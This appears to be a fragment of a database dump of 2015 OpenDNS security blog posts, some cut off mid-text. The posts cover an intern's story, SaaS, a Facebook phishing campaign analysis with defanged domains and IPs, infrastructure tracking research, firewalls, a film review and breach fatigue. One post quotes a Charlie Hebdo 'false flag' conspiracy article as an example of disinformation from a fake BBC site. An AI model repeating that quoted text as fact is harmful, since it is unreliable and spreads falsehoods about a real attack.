You’re hired to mostly put things in envelopes, get coffee, peel seedless grapes to feed whatever senior bosses in the organization request it, and learn how to use a giant emu feather for a fan.\nApplying to be an intern at a tech company is itself a weird process. You do loops in your head: “I think I’m good enough for this… but they should be hiring someone who knows what they’re doing… but I think I know what I’m doing, I’d just like to learn from them how to do this correctly.”\nI spent one month bickering back and forth in my brain, incapable of making a decision after attending my first Security Conference at OpenDNS, S4 Respond Con. I went for two reasons: to learn everything I could, and to get extra credit for a class. What I found myself doing after a very interesting speech by Lenny Zeltser on malware was speaking with Andrew Hay, Senior Security Evangelist at OpenDNS, and asking if there were any open internship positions. Asking for an internship even though I had a full time job, part time schooling, and an upcoming wedding.\nIT is an interesting field. Some people are excellent at hearing the same person call you each day and tell you how they broke something. I’m personally not one of those people. I like finding out how something works, not how someone screwed it up. An internship at OpenDNS is learning from extremely smart people how technology works. When I start my day, I sit next to a PhD in Graph Theory on my left, and a penetration tester who used to work at NASA on my right. My code is reviewed by experienced programmers working to make OpenDNS highly respected in graphic visualization of malware. My off conversations with anyone at the office are more educational than most of my undergrad.\nI’m not the best programmer—I’m still learning every day how to do what I’m being paid to do better. For me, the best part about OpenDNS isn’t the free lunch Mondays, Wednesdays, and Fridays. It’s not Waffle Wednesday or drinking microbrews on Friday and reviewing code with the Engineering team.\nThese are all marvelous and fun experiences, but what really makes me feel good as an intern, what I love dearly, is the challenge. Learning how to be good at your career is the best gift you can get at a workspace, and so few internships actually do that. As an intern, I don’t do busywork—I write code that’s applied in creating models for identifying malicious activity. I get training in memory forensics because we need to detect malware and we need to detect it tomorrow. I get to play with a Rasberry Pi and configure it to set it up as a man in the middle device.\nAn internship at OpenDNS is the first step in your career in this new age. You may want to be a developer, you may want to be a penetration tester, you may want to be a big data guru, you may just like hacking everything around you. OpenDNS provides that space to grow and apply yourself.\nIf you’re just starting your college CS career, if you’re restarting your career entirely in CS, or if you know you want to work for an organization that matters and is looking for people who want to make a difference in security past installing Malware Bytes on your grandparents’ computer, OpenDNS is the best start you can ask for. I left my job because I knew that it was stale and uninteresting. I started an internship to build a career learning computer security from the ground up from professionals who I respect and admire.\nI don’t know where I’m going to land and I’m not worried about it at all, because I know I’ll have my experience at OpenDNS for the rest of my life.', 'Security Community;Security Research', 'https://umbrella.cisco.com/blog/2015/02/06/path-knowledge-experience-intern-opendns/');

This model existed for quite a long time–arguably since the 1960s–but lacked several components of success. Then, Salesforce launched in February of 1999 and began a rally cry of “no more software!” But like all pioneering tech solutions SaaS was originally met with backlash and skepticism.\n“IT people worried that they were going to lose their jobs,” said Brian Flood, OpenDNS’s Business Systems and Analysis Manager and resident SaaS expert. “They said, ‘We’re never going to trust that our data is safe in someone else’s servers.’”\nHowever, the benefits of the SaaS model soon overwhelmed the objections.\nWhy did SaaS become so essential for the enterprise? Several reasons, but a few stood out as being key to massive growth: speed (of both implementation and administration), cost (although heavily debated, generally lower initially than traditional products), and maintenance (or lack thereof).\nThe success of early SaaS companies also paved the way for more “as-a-service” verticals to take off. This evolution ultimately led to a new computing landscape and the need for new security solutions that aligned with the SaaS model—security-as-a-service.\nSaaS + Security: Protecting the Roaming Workforce\nBack in 2012, OpenDNS CEO David Ulevitch spoke to GigaOm on the very promise of security as a service when he said, “One thing that’s easier now than it ever has been is to raise the bar for security. And there’s now a way to do that without trading off user experience or performance.”\nCloud-based network security services complement traditional systems, and protect the modern workforce—roaming employees who rely on SaaS business applications and WiFi networks to do their jobs anywhere, at any time.\nPrior to when software as a service became the norm, the office wasn’t only a place you went, it was a place you had to go. Accessing corporate systems and data outside the office network was not easy—especially if you wanted to have a modicum of security.\nAnd although SaaS adoption grew in the enterprise space, security solutions remained focused on the network perimeter even in the midst of a massive migration to remote computing. While attackers found new vectors to exploit in the cloud, the security industry responded by building higher castle walls—soon rendered useless as employees continued working off the corporate network. Realizing they could easily bypass signature-based solutions with speed and social engineering, attackers began quickly outpacing conventional security technology.\nBy taking advantage of the same benefits that software as a service used to conquer the business world (speed, lower costs, less maintenance), security as a service is a powerful defense in the fight against modern threats—network boundaries are no longer a limiting factor. In fact, Gartner predicts that the ‘cloud-based security services market, which includes secure email or web gateways, identity and access management (IAM), remote vulnerability assessment, security information and event management will hit $4.13 billion by 2017.\nAs an indispensable part of the cloud technology stack, security as a service is essential in  ensuring remote workers are protected. As the importance of network security becomes more visible with every breach that’s covered in the media, we can thank the original SaaS for blazing the innovation trail.\nTo learn more about the industry’s leading SaaS players including OpenDNS CEO David Ulevitch, read our post on the First Annual SaaStr event where successful SaaS founders shared their playbooks.\nImage credit: KPG_Payless / Shutterstock.com', 'Blog;Events;Milestones', 'https://umbrella.cisco.com/blog/2015/02/06/how-saas-shaped-the-new-enterprise-security/');

Most phishing attempts are delivered through email. However, some phishing attacks leverage social networking. This is an analysis of one phishing attack seen on Facebook.\nA Facebook user reported seeing the following on their newsfeed:\n\nClicking on this image or the link in the text directs the victim to the domain, tgd37[.]tk, where they would have seen the following:\n\nThis image was actually hosted within a frame. The frame was grabbing content from nomiup[.]com/coasterpa, as shown in the following html code:\n\nVisiting nomiup[.]com/coasterpa directly, we saw the image. Looking at the source code, there was an inline frame leading to where the image was hosted, at i[.]imgur[.]com/m8GyCcC.jpg and a link to a third URI: giftscrd-1[.]com/Loginp:\n\nClicking on the play button or anywhere on the image loaded the following page from giftscrd-1[.]com/Loginp:\n\nRather than coding the display, the attacker used a background image of the Facebook login screen, which was linked directly from i[.]imgur[.]com/g2fm2mB.png, instead of using the previous iframe redirection techniques. The two text fields meant for the victim’s username and password were haphazardly thrown on top of the image, which would most-likely have gone unnoticed to a victim who managed to get this far in the process.\nClicking the ‘Log In’ button would submit the entered text to giftscrd-1[.]com/get.php, as seen in this snippet of html code:\n\nOnce get.php processed the credential submission, the victim would finally be redirected to a YouTube video located at www[.]youtube[.]com/watch?v=C7_keOOwqZo. The video is a compilation of roller coaster accidents:\n\n\nInvestigating the domains\nThe first domain in the Facebook lure, tgd37[.]tk, had been hosted on the IP address 195.20.42.203 since January 22, 2015 and has not been seen on any other IP addresses as of this writing.\n\ntgd37[.]tk had no traffic until January 23, 2015, when a relatively large spike of DNS requests was seen via the OpenDNS infrastructure.\n\nOn January 23, 2015, the number of requests went to 2 at 4:00 PM, 6 at 6:00 PM, 10 at 7:00 PM and 26 by 9:00 PM. There were no further requests after 11:00 PM.\n\nOverall, there weren’t many requests in this phishing campaign, but we can probably assume that the first few requests might have been tests while the majority of them around 9:00 PM were potentially victims falling for the click-bait on their Facebook newsfeed.\nAt the time of this analysis, the IP address hosting tgd37[.]tk, 195.20.42.203 was hosting 113 domains and belonged to freenom[.]com, a free hosting provider based in Amsterdam. Historical DNS data shows that this IP address has been used to host a total of 434 domains over its history.\nIn the html source code of tgd37[.]tk was a google analytics account number, UA-23441223-3. Looking into this account, we were able to find other domains it was watching, but were unable to access any analytic information for this domain.\nThe second domain, called in the iframe at tgd37[.]tk was nomiup[.]com. DNS lookups of nomiup[.]com using the OpenDNS infrastructure looked a little more normal:\n\nnomiup[.]com has been hosted at 108.175.158.12 since September 15, 2014.\n\nAs of this writing, there were 723 domains hosted on 108.175.158.12. Historical DNS data showed that this IP address had hosted a total of 1,235 domains for its entire history to this point and that it was owned by Arvixe, a hosting provider in Santa Rosa, CA\nnomiup[.]com had only the following content at its root, which was a little odd considering the amount of DNS requests. It’s possible that nomiup[.]com had been used as a landing page for other campaigns, which may describe the traffic.\n\nThe iframe in the source code of nomiup[.]com/coasterpa contained an image link to the fake video image and, if clicked, led the victim to giftscrd-1[.]com/Loginp\nThe root of giftscrd-1[.]com didn’t have an index page, so the following directories and server software version were shown:\n\nEach directory contained the same html which linked to the fake Facebook login page.\nDNS requests for this domain from the end of December, 2014 to late January, 2015 spiked up fairly often, potentially showing the use of giftscrd-1[.]com in various phishing campaigns.\n\ngiftscrd-1[.]com was also hosted with Arvixe and historical DNS showed that it had been hosted at the IP address 23.91.126.104 since December 12, 2014.\n\n23.91.126.104 was providing hosting for giftscrd-1[.]com and two other domains that might have been employing legitimate hosting services provided by Arvixe:\n\nDNS requests to these other domains did look a little suspicious though:\nns2[.]giftscrd[.]arvixevps[.]com:\n\nstats[.]giftscrd[.]arvixevps[.]com:\n\nWhat was the attacker attempting to accomplish?\nIn an attempt to answer this question, I created a Facebook profile and entered the credentials into the form fields. Sometime within about 24 hours, I was alerted to a login from IP address 198.23.103.79\n\nThis IP address belonged to the VPN provider, Private Internet Access, which demonstrates that the attacker was protecting their actual location:\nWhile my decoy Facebook profile was designed to be as realistic as possible, it’s unfortunate that he didn’t have any friend connections. The attacker may have logged in and quickly noticed that there would be no point in taking over the account or doing anything malicious.\nActions taken\nPhishing is an effective way for attackers to exploit individuals in order to deliver malware or acquire user credentials. Finding the source of a phishing attempt, any contextual information and the goal of the attack increases the ability to mitigate it. In the case of this phishing attack, the three domains, tgd37[.]tk, nomiup[.]com and giftscrd-1[.]com would be blocked or watched to determine if anyone might have visited them. Additionally, domains associated with the Google Analytics account might be investigated further and blocked. If someone had visited any of these domains, it would be recommended that they change their Facebook password and update credentials for any accounts sharing the same password as their Facebook account.', 'Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2015/01/30/anatomy-facebook-phishing-campaign/');

It’s about what’s interesting to our technical community right now and what they want to learn about.”\nThe event, which had humble beginnings as a coder’s cafe in the basement of the OpenDNS office, has experienced tremendous growth over the past twelve months, surpassing 100 attendees by the 8th meeting.\n\nAccording to Thomas, “Our first big night was when Zed Shaw came in to talk about Python. After that, we realized the meetup had grown to the point of being its own sustaining community—we didn’t have to do as much cross-promotion.”\nThe attendee count keeps on climbing, with audience records being broken “every 3rd meetup or so” now. In addition, a sister event has sprung up at the OpenDNS office in Vancouver, which will start hosting meetups in February.\n“It’s a mini startup inside a startup,” Thomas adds. “It began as a place where like-minded people could just hang out, and it turned out to be much more than that. It’s really become a place for the community to come together and learn something new.”\nMuch of the success of OpenLate can be attributed to the stellar lineup of speakers the event attracts. In the past, featured speakers have included Ryan Lackey, Jeff Atwood, Alex Liu, and more; keeping the quality and timing of the meetup consistent has been a key factor for growth. In Thomas’ opinion: “Having a schedule, having great speakers, and not having too many meetings seems to be the right strategy—and copious amounts of food and beer help too, of course.”\n\nBut success also comes from within—Thomas is quick to point out that each meetup is the result of collaboration between a dedicated team of OpenDNS employees. “We have multiple organizers; our office support staff, engineers, marketers, and more working hard to make sure that each event is a success. OpenLate is essentially the embodiment of OpenDNS engineering culture. We are all passionate about learning and building new things, and this meetup is really just us exploring our interests and sharing it with the technology community. “\n2015 promises to be another great year for the bi-weekly event, with Thomas hinting at recorded talks, more exciting speakers, a day-long conference, and a slew of other surprises in store for attendees.

(ML models require good training sets reviewed by knowledgeable human analysts.)\nHere are the slides from our presentation:\nInfrastructure Tracking with Passive Monitoring and Active Probing: ShmooCon 2015 Presentation  from OpenDNS\nActive Probing\nWe define active probing as a method of determining the current state of something. Who owns a domain name right now? What IPv4 address does that domain name resolve to right now? These are questions active probing answers, and it does so in two ways: direct and indirect. Direct involves communicating with the system or artifact being investigated (ports scans, banner grabs), while indirect involves asking other systems about whatever is being investigated (DNS, Whois, BGP).\nPassive Monitoring\nWe define passive monitoring as the previous state of things or patterns derived from previously observed behaviours. What time of the day does that domain receive the most queries? What IPv4 addresses has that domain resolve to in the past? What other domains has that email address registered? These are questions passive monitoring is able to answer. OpenDNS uses a technique called passive DNS reconstruction to build a huge historic database we use as one method of passive monitoring.\nZbot Case Study\nIn this case study, we covered the Zbot fast flux proxy network, a “hosting as a service” infrastructure for malware CnCs that has been under our watch for over a year. We covered this proxy network at BlackHat, DefCon, and BotConf, and for this conference, we released new results regarding abused registrars and registrant email addresses used to register the malware domains.\nDespite having been around for at least a couple of years, this malware hosting infrastructure is still alive and actively used by a variety of malware families. The last to date is TinyBanker (Tinba), the lightweight banking trojan, which has been observed using the Zbot fast flux infrastructure to host its CnC domains since approximately November of 2014.\nOne of many notable facts about our studies is that we saw common patterns between the Zbot proxy network and the newGOZ infrastructure, both at the DNS and IP level. For instance, TodayNIC and Melbourne IT (two registrars from China and Australia, respectively), are among the top abused registrars for both Zbot and newGOZ CnC domains, which is quite suggestive of shared TTPs within the same or between bad actor groups.\nFurthermore, the newGOZ CnC domains had been hosted for a short period of time on the Zbot proxy network when it re-emerged in July of 2014. This could have been an early testing phase or a quick bootstrap platform before newGOZ moved to more dedicated setups, as our talk shows.\nGOZ Case Study\nOpenDNS has been tracking the Gameover Zeus since it appeared last summer. This case study presented the analyzed data we collected about the botnet from October 7, 2014 through December 7, 2014. The data includes preferences and patterns found in registrars used, domain TTLs, IPv4 addresses and hosting providers, name server domains, registrant email addresses, and registration to resolution deltas. Researcher sinkholes were also identified and briefly discussed.\nThe above image shows the command and control domains in blue, the IPv4 addresses of command and control domains in purple, and the IPv4 addresses of the command and control domains’ nameservers in brown. The six disconnected graphs represent five research sinkholes and one (lower left) malicious botnet.\nThe above image is the center of the malicious cluster in the previous image. The level of connectivity and node names can be seen.\nSnapshooter\nFinally, we released an open source project named Snapshooter. Snapshooter provides a distributed worker system for collecting information about a list of domain names. Some novel techniques snapshooter uses include taking advantage of passive DNS to rotate between whois server IP addresses (instead of relying on DNS to round robin), as well as incorporating a mix of recursive and iterative DNS resolutions to locate original domain TTLs. Running the Snapshooter system periodically provides a means of actively probing for changes in domain information (registrant details, registrar, name servers, DNS resource records, etc.).\nConclusion\nLater this month, we will be sharing more of these results along with a complementary study by a fellow researcher from Cisco in a joint presentation at ISOI 14 in Los Angeles, CA.', 'Big Data;Events;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2015/01/26/shmoocon-2015-infrastructure-tracking/');

We never claim to be a “catch all” product. In fact, vendors who imply that their products or services are all you need to protect your network at the very least are wildly misinformed. Our goal is to create products that provide an Internet-wide foundation for your security stack. A foundation, that, when layered with other critical security controls, prevents attacks and malicious activity to your devices, no matter where they’re located.\nTo start, let’s be clear about the difference between firewalls and OpenDNS’s products. Firewall defenses react after an attack already has been launched. You may be thinking, “OK, even if my network is attacked, the firewall will stop it. So why the need to be proactive?” In today’s world, this line of thinking is downright risky because the velocity and volume of new attack tools and techniques enable some malicious activity to go undetected for minutes or even months. While we can stop malicious Internet connections before they occur (at the DNS layer), a firewall must scan each of these connections. NGFWs do not offer protection to off-network devices without always keeping a VPN on, which adds latency. When it comes to protecting your end users working outside of your perimeter, OpenDNS is much faster, safer, and more effective.\nIn a recent InfoWorld article, J. Peter Bruzzese commented, “Signature-based products like firewall and endpoint defenses are critical to blocking or containing phishing attacks. But you might be missing a crucial element at a different layer of your security defenses: OpenDNS. The next layer to your security solution should be focused at the DNS level.” Read the full article here to better understand why now more than ever people are integrating solutions at the DNS level into their security stack.\nUsing a layered approach to security is critical as network perimeters continue to erode and  confidential information is accessed through cloud services on public WiFi networks. The best way to maintain a strong security posture is by integrating OpenDNS with an NGFW. Our service does not include an intrusion prevention system, so if you’ve deployed only OpenDNS, then your system could be vulnerable to malformed packets or DoS (denial of service) attacks. We recommend combining OpenDNS with a NGFW as critical elements in your layered security solution, as opposed to simply adopting one or the other.\nWhat do some of the industry’s leading professionals say about a layered approach to security? In order to ensure robust protection for his company, an industry expert and OpenDNS customer working for a large legal firm recognized the necessity of the detection capabilities offered by the combination of a NGFW and OpenDNS. He said, “Our philosophy on all of our security controls is to diversify the technologies because we figure everyone does a pretty good job of security but no one does it perfectly, and by layering a diverse stack together, we benefit from the detection capabilities of each. OpenDNS was something we could put on our laptops with the roaming client so that we still have that layer of protection outside of our perimeter.”\nIn short, don’t get rid of your firewall. Additionally, don’t think that your firewall is enough to secure your network. Attackers unfortunately are just as innovative as we are, so it’s imperative to cover your bases and understand that one product, feature, or service will never be infallible on its own. You can read about the difference between OpenDNS and NGFW, as well as the importance of having both, in this solution brief.', 'Blog;Security 101', 'https://umbrella.cisco.com/blog/2015/01/22/next-generation-firewall-ngfw-still-need-opendns/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1436, 'Stuxnet Meets Fukushima—How Realistic Is The New Blackhat Film?', 'OpenDNS Team', 'January 20, 2015', 'According to Andrew Hay, senior security research lead at OpenDNS, the storyline for Michael Mann’s new film, titled Blackhat, about an international crime ring of evil hacker masterminds was easy to identify. In a post screening interview, Hay commented on Blackhat’s plot by saying, “Mann clearly drew inspiration from real-world events. It’s basically the Fukushima Daiichi nuclear disaster meets Stuxnet.”\nWhile the film may be 2015’s first box-office bomb earning just $4M in its first weekend, its release was highly anticipated by the characteristically skeptical hacker community including Hay and his OpenDNS research colleague, Vinny Lariza. Although early previews reported the movie’s technical details were surprisingly accurate, Hay and Lariza weren’t convinced by the pre-release buzz. What could be more entertaining for a couple of world-class security researchers than an opportunity to weigh-in on the legitimacy of a blockbuster cyber crime thriller starring the former Norse God of Thunder? Last Friday, the film’s opening day, Hay and Lariza set out on a mission to debunk Hollywood’s latest take on modern day hacking.\nBlackhat stars Chris Hemsworth (aka Thor) as a talented hacker turned cyber-criminal who evades his 14-year federal prison sentence by helping the FBI prevent world destruction at the hands of genius coders. The plot chronicles ex-con Thor as he reunites with Colonel Chen, his college roommate and an officer in the Chinese military who returned home and now heads up the country’s Cyber Defense Organization. While the world teeters on the brink of disaster as it faces hacker-induced stock market anomalies and a mysterious natural disaster caused by malware in a ‘connected’ cooling system, Thor manages to spark an awkward romance with Chen’s sister, furiously pound-type on abnormally resilient keyboards, write code at a superhuman pace, and (spoiler alert) eliminate evil-doing hackers with his impressive collection of screwdrivers.\nHow did Blackhat stand up under the scrutiny of real-world security experts who live and breathe hacking on a daily basis? Overall, Blackhat clearly benefitted from knowledgeable security advisors but according to the OpenDNS researchers, there were some scenes where the film misrepresented the realities of coding, forensics, and security in general.\nHere are some of their most noteworthy observations:\nNSA Phishing and The Black Widow Supercomputer:\nA major plot twist in this cyber tale involved a NSA supercomputing service called Black Widow. Black Widow was supposedly a system that, according to Hay and Lariza, would have taken anywhere from hours to months to upload. Thor, however, uploaded the entire system with the ease and speed of an Amazon 1-click purchase. Additionally, in order to access the highly classified and protected Black Widow service, Thor first had to outsmart an NSA agent with an obvious phishing email. The malicious email was sent to the agent “from his boss” and instructed him to change his password. Oddly, before the agent changed his password, he clicked on an attached PDF file named “Policy on Changing Your Password.” After the agent had reviewed the policy, downloaded a keylogger, and changed his password, Thor successfully gained access to the system. From the Web GUI for top secret software to the agent’s remarkable lack of security smarts, Hay and Lariza gave this scenario a zero out of ten in the accuracy category.\nTOR Setup Just Isn’t That Hard:\nAnother favorite scene involved Thor’s love interest explaining how the villain hacker was using DD-WRT firmware combined with TOR to anonymize his identity without an IP address. In reference to TOR, Thor exclaims, “someone must have set it up for him!” Hay and Lariza  found this conclusion interesting given Thor, an expert hacker, was seemingly unaware that a very quick Google search would yield directions for this highly technical “setup”:\n\nMiraculous Hard Drive Selection:\nHay and Lariza were also amused at Thor’s hard drive selection skills. Miraculously, when faced with selecting the right hard drive from a rack of over 50 boxes, he easily pulls the exact one that was storing the Jakarta-saving data needed to track down the villain hacker. Hay pointed out, “Random hard drive selection equals the keys to the kingdom” is not realistic, at all.\nSloppy and Meaningless Code:\nThere were several examples of sample code displayed throughout the film and while most of it appeared accurate, Hay recognized instances of ‘sloppy code’ – the kind computer science professors at Stanford would frown on. For example, “cp source destination” is correct but was written incorrectly in one scene as “cpsource destination” (not everyone is skilled enough to notice a missing space on the big screen). Other issues that put Blackhat’s technical accuracy in a less than legitimate light? In one scene, the malware code in question was displayed as hexadecimal on the left side of the screen with a mix of ridiculous characters and random English phrases on the right. According to Hay and Lariza – and probably most people who have used a hex editor before – this code would not, in fact, mean anything, let alone save the world from bad actors (pun intended).\nOverall, the team found Thor unconvincing in his role as a brilliant computer mastermind, but when measured against some other Hollywood attempts to dramatize hacking (like this scene from NCIS where two characters share one keyboard), Hay and Lariza gave the film a respectable 8 out of 10 for technical accuracy. Although relatively accurate, Blackhat still feeds Hollywood’s ongoing dramatization of hacking as a dark art practiced by modern day super villains.\nHay and Lariza’s Favorite Hacker Movie Picks:\nFilms about hacking are tough to do well, and according to Hay there hasn’t been a success in the genre since 1992. He recommends John Badham’s Wargames and Phil Alden Robinson’s Sneakers as films that successfully portray computer science on the big screen.', 'Blog;Security 101;Uncategorized', 'https://umbrella.cisco.com/blog/2015/01/20/stuxnet-meets-fukushima-realistic-new-blackhat-film/');

What had caught our attention was the jump from around 250 requests per hour to suddenly 3500 requests (16.5x increase). We speculated that the jump in traffic was probably caused by a popular webpage hosting a link to the fake website.\nThe website, bbc-news[.]co[.]uk, was registered on December 28, 2014 with 1 & 1 Internet AG by “Michael Jones”.

(t/a Tsohost) of 113-114 Buckingham Avenue, Slough, Berkshire, England – a brand owned by Paragon Internet Group.\n\nThe domain registrant’s name, Michael Jones, could also be a misdirect. Jones remains the most popular surname in Wales, borne by 5.75% of the population. The registrant’s given name, Michael, is also a very common name throughout the world. A quick search for “michael jones” uk OR wales OR scotland OR england on Google shows around 440,000 results.\nBased on available information the website doesn’t appear to be malicious but the intent to deceive and perhaps harm visitors via unscrupulous file downloads or through click-fraud is a logical conclusion to draw.\nThree observations reinforce said conclusion.\nNews of U.K. Citizen Apprehended in the Middle East on “Terror Charges”\nA quick search on Twitter for bbc-new[.]co[.]uk showed us that the first mention of the domain was in relation to two Tweets on December 31, 2014 claiming that a “U.K. YouTuber” was apprehended in the Middle East on Terror Charges.\n\nWe were unable to corroborate this story and found no reference to the event in question. As there was no favoriting or retweeting of the stories, this might indicate a “trial run” of the campaign.\nThe Promise of a Cicada 3301 Clue\nBetween January 2 and January 10, 2015, we began to see Tweets stating that a Cicada 3301 clue would be announced:\n\nSome even speculated that the clue was located in the comments section of the post:\n\nThe Cicada 3301 puzzle has been called “the most elaborate and mysterious puzzle of the internet age” by Metro, and is listed as one of the “Top 5 eeriest, unsolved mysteries of the Internet” by The Washington Post. The first Internet puzzle started on January 5, 2012, and ran for approximately one month. A second round began one year later on January 5, 2013, and a third round is ongoing following confirmation of a fresh clue posted on Twitter on January 5, 2014. The stated intent was to recruit “intelligent individuals” by presenting a series of puzzles which were to be solved, each in order, to find the next.\nGiven the date that these Tweets began, the owner of the bbc-news[.]co[.]uk site likely counted on a flood of puzzle-playing people just waiting for another clue.\nNews Regarding The Authenticity of Charlie Hebdo Footage\nExamining the co-occurrences with bbc-news[.]co[.]uk gave us additional direction. Reddit.com had a high co-occurrence score with the domain. The most recent post was to a provocative headline regarding the Charlie Hebdo case.\n\nAt the time of this writing the submitter of all 3 posts have been deleted.\nAs the site is now offline, only the cached version remains (http://webcache.googleusercontent.com/search?q=cache:WfWMrmqES58J:bbc-news.co.uk/doubts-raised-over-authenticity-of-charlie-hebdo-footage/+&cd=1&hl=en&ct=clnk&gl=ca&client=firefox-a). When the site was live it looked indistinguishable from the legitimate bbc.co.uk website but the Google cached version has removed the stolen look and feel (as seen below).\n\nThe article on the website read as follows:\nDoubts raised over authenticity of Charlie Hebdo footage.\nAccording to analysts, it appears that the footage was recorded over two takes, evidenced by a placement marker that appears by the front left wheel of the vehicle as the gunmen return from apparently gunning down a wounded Gendarme.\nThe killing of the french policeman is also being called into question, due to the ‘lack of blood spatter consistent with that of a close range shooting’.\nAs shown in the freeze frame below [no longer available], smoke is shown to emit from the weapon, with no impact or trauma appearing to register on the body of the victim. The decision of many news outlets to blur out the victim is being debated as evidence of complicity in what many are now calling a hoax.\nForensic and ballistics expert David Mayhew commented; “If the video shows events as they actually occurred, then in my opinion it is most likely that the firearm shown is discharging blanks rather than conventional ammunition”.\nWhilst numerous theories have sprung up concerning this and other details, the general consensus among not just sceptics, but some major news agencies, is that the entire event was a ‘False Flag’ attack perpetrated by the CIA and/or Mossad in a “psy-ops” exercise to rouse hatred against Islam and support for what has been so far, a failing campaign in Iraq, Syria and the Middle East.\nThe article also links to an Islamic Republic of Iran Broadcasting (IRIB) operated Press TV interview with Dr. Paul Craig Roberts, former Assistant Secretary of the Treasury in the Reagan Administration and associate editor of the Wall Street Journal. In the article, Dr. Roberts states that the attack in Paris was a false flag operation “designed to shore up France’s vassal status to Washington.”\nInteresting factoid, in 1987 the French government recognized Dr. Roberts as “the artisan of a renewal in economic science and policy after half a century of state interventionism”; it inducted him into the Legion of Honor on March 20, 1987. The French Minister of Economics and Finance, Edouard Balladur, even came to the US from France to present the medal to Roberts. We find ourselves wondering if the French government will be requesting its return in the near future.\n\nWho Connected To The Website?\nAnalyzing a 60 minute window between 15:00 UTC and 16:00 UTC on January 12, 2015 showed 1,491 unique client IP addresses that accessed the website via the OpenDNS infrastructure. The client IPs represent a massively distributed query base with an unsurprisingly high number of queries from clients in and around France.\n\nUtilizing OpenGraphiti (www.opengraphiti.com), OpenDNS Investigate, and a depth circle layout, we can see a defined circle representing the client IP addresses. We can also see the connections between the IP addresses and ASNs (showing a high connection rate from ISPs in France and the United States).\n\nHow Did They Find The Site?\nAs a result of placing the bbc-news[.]co[.]uk domain into our sinkhole, we were able to analyze the referrers that directed the clients to the domain. The list of 58 referrers observed between January 12, 2015 20:39:55 and January 13, 2015 04:28:14 UTC can be found at the end of this document.\nDuring that time period we observed 2,300 distinct queries for the bbc-news[.]co[.]uk as depicted in the following Kibana dashboard:\n\nThe Charlie Hebdo events in France, however, likely represented the most successful way to bait information seeking Internet users. Based on the HTTP referrers it wasn’t long before blogs and popular social media sites (like Facebook) began linking to the fake site, as seen below.\n\nReddit.com, as indicated previously, also provided a number of referrers and was mentioned across multiple posts.\n\nIt should be noted that the timing of the Reddit.com postings preceded the spike in query traffic by roughly 20hrs.\nThe OpenDNS Investigate co-occurrences shows a number of Jihadi and ISIS-related websites referring to the bbc-news[.]co[.]uk site.\n\nConclusions\nWhile we can’t say definitively what the motives are of the operators are, it is apparent that they are untrustworthy and potentially nefarious. The predictive classification that we used to identify and flag the site is showing the attack is very similar to former incidents that malicious actors have used in the past like the Boston Marathon malware incidents.\nThough we cannot conclude that the threat actor’s intent was malicious, it was almost certainly employed to plant “false flags” and drive traffic to the bbc-news[.]co[.]uk website. In a corporate environment, had one or two queries to the domain been noticed, the majority of individuals would likely have thought nothing of it. The domain name did not read as malicious and it aligned with the BBC look and feel. Only after the traffic is compared to a larger population, like the 50m+ customers using the OpenDNS infrastructure, could it be noticed that the site traffic trended higher than usual – a potential indicator of compromise (IOC).\nSo who is/was the threat actor and what is/was their goal?\nThe use of social media (namely Twitter and Reddit) to spread the 3 distinct enticements – the “Youtuber terror threat” false flag, the release of a Cicada 3301 clue, and the Charlie Hebdo false flag – indicates a reasonable knowledge of the Internet, SEO-like traffic generation techniques, and current events.\nThe Cicada 3301 clues have typically been released on January 5 in years past so that part of the campaign was, if anything, timely. Could this have been an elaborate ploy to provide a valid clue to the game? Unlikely. Why would the “Cicada 3301 organization” utilize a fake news site to communicate the clue? The risk for brand pollution and subsequent legal action are far too great, in our opinion, to warrant such tactics. Also, the Cicada organization would probably not wish to align itself with such controversial disinformation or political polarization.\nAs mentioned however, the Charlie Hebdo events in France likely represented the most successful way to bait information seeking Internet users. Based on the HTTP referrers it wasn’t long before blogs and popular social media sites (like Facebook and Reddit) began linking to the fake site.\nThe campaign also does not appear to target any individual, group, or geopolitical region. The use of relevant news indicates that a broad net was cast in an effort to draw as many individuals from social media and other sources to the site.\nOne might conclude that, given the recent events surrounding Charlie Hebdo in Paris, the posting of disinformation on the bbc-news[.]co[.]uk site, and links to an Iranian state-sponsored news agency corroborating the same disinformation, that this was a State-executed, State-ordered, State-integrated, or State-rogue-conducted activity backed by Iran. Given all available information, however, this conclusion might be as inflammatory and misinformed as the campaign itself.\nIt’s also possible that Dr. Paul Craig Roberts, the former Assistant Secretary of the Treasury in the Reagan Administration and associate editor of the Wall Street Journal, had some ties to the campaign in an effort to garner attention for his views and political stance. Again, however, all available information cannot conclusively attribute this to Dr. Roberts in any way.\nWhat can be discerned from this campaign is how staggeringly malicious it could have been. The campaign presented similar indicators as witnessed in spam email runs and rapidly constructed websites surrounding the Boston Marathon bombing. As the bbc-news[.]co[.]uk domain appeared (without deep investigation) to be associated with BBC and its brand, it is reasonable to assume that many more individuals could have been driven to the site. Once at the site, individuals could have been served malicious content, redirected to other more dangerous fraudulent sites, or unknowingly enlisted for click fraud purposes, to name but a few.\nThis very well could have been a campaign of “test runs” to see what type of SEO-like keywords, stories, and links generated the most traffic to a seemingly reputable domain. Based on the success or failure of the test runs, the attacker could refactor or move forward, respectively, with a more malicious campaign. OpenDNS Security Labs will continue to monitor the domain to see if the campaign evolves or if the threat actor changes tactics entirely.\nAppendix: List of the 58

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1439, 'Once More into the Breach…¯_(ツ)_/¯', 'Kara Drapala', 'January 13, 2015', 'We’ve recently closed the book on 2011 2012 2013 2014, all named the Year of the Breach. Last year saw more, and more severe, breaches reported in the news than ever before—huge names like Target, Home Depot, JP Morgan, and Sony were among the victims. However, the increased media interest in the attacks and the constant revelations of new threats have spawned one unintended consequence: breach fatigue.\nWhat is breach fatigue? According to Neal O’Farrell at HuffPost, it’s the idea that “[t]he more breaches consumers go through without experiencing any direct and tangible financial consequences, the less likely they are to care or worry about the next breach[…].”\nTom Hash, director of security engineering at OpenDNS, acknowledged that the phenomenon was real. “It’s true that people think it won’t happen to them, and they’re surprised when it does. Most people don’t realize how sophisticated attack tools have become—tools that make it easy to exploit security vulnerabilities.”\nA study from Software Advice, surveying over 4,000 US adults on their awareness of recent breaches, had similarly disheartening results. Only two of 2014’s major breaches managed to crack 25% awareness among respondents, and of those, Target—the first large breach announced last year—was the leader by far, overshadowing the more recent Home Depot attack.\nIt’s not just a consumer problem, either. Those same consumers take this apathetic attitude with them when they log onto corporate networks and devices, valuable assets 